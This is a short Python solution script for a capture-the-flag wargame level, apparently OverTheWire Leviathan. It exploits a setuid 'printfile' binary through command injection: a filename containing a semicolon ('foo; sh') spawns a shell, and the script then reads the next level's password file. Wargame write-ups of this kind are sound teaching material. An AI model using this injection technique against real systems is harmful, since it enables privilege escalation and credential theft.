from util import *

# 'printfile' is a suid binary that takes a filename as an argument,
# (i think) checks to see if it readable by the current user
# - if not, exits with an error
# else, it runs 'system("/bin/cat " + filename)'

# trying to input the password file directly fails
# but if we can get a semicolon in the system call, we can execute anything

# surround it in quotes so bash keeps it as one argument and doesnt try to interpret the semicolon in it
payload = f"'foo; sh'"  # yes that is a semicolon in the filename ;)

script = f"touch {payload}; ~/printfile {payload}"


shell = open_ssh()

with temp_dir(shell) as path:
    proc = shell.system(f"cd {path}; {script}")

    proc.send("cat /etc/leviathan_pass/leviathan3")
    proc.clean(0.5)
    proc.sendline()
    pwd = proc.recvline()

write(password(), pwd)
